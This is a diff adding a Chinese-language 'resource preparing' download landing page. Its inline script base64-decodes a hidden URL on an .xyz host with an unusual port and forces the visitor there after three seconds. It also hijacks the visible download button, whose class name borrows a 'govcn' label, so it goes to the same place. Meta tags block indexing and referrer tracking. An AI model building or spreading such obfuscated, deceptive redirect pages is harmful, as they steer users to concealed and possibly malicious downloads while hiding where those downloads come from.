@@ -1,0 +1,38 @@
+﻿<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+  <meta name="referrer" content="no-referrer">
+  <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <link rel="canonical" href="https://miejupi.com/">
+  <title>资源准备中</title>
+  <link rel="icon" href="/favicon.ico">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body class="kexue-page">
+  <main class="redirect-card">
+    <h1>资源准备中</h1>
+    <p>正在校验连接环境</p>
+    <div class="progress" aria-hidden="true"><span></span></div>
+    <p>即将进入下载页面</p>
+    <p>请勿关闭当前页面</p>
+    <a id="manualDownload" class="download-btn download-btn-miejupi-govcn" href="/kexue.html" rel="nofollow noopener noreferrer">立即下载</a>
+  </main>
+  <script>
+    const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9haHpxLjMxMzQ4Ni54eXo6MzU4ODgv");
+    const manualDownload = document.getElementById("manualDownload");
+    window.setTimeout(function () {
+      window.location.replace(REAL_DOWNLOAD_URL);
+    }, 3000);
+    manualDownload.addEventListener("click", function(e){
+      e.preventDefault();
+      window.location.replace(REAL_DOWNLOAD_URL);
+    });
+  </script>
+</body>
+</html>
